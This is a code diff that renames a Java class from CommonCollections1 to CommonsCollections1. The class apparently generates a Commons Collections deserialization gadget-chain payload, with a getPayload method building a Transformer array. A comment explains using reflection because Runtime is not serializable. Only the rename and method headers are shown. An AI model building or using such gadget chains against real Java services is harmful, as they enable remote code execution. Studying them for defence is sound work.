@@ -18,7 +18,7 @@ import java.util.Optional;
 /**
  * created by xjj on 2023/1/27
  */
-public class CommonCollections1 {
+public class CommonsCollections1 {
     public byte[] getPayload(String exp) throws ClassNotFoundException, NoSuchMethodException, IOException, InvocationTargetException, InstantiationException, IllegalAccessException {
         Transformer[] transformers = new Transformer[]{
                 // runtime接口没有实现java.io.Serializable所以要继续使用反射, 因为Class类实现了Serializable
@@ -86,6 +86,6 @@ public class CommonCollections1 {
 
 
     public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException, IOException {
-        new CommonCollections1().gadget();
+        new CommonsCollections1().gadget();
     }
 }
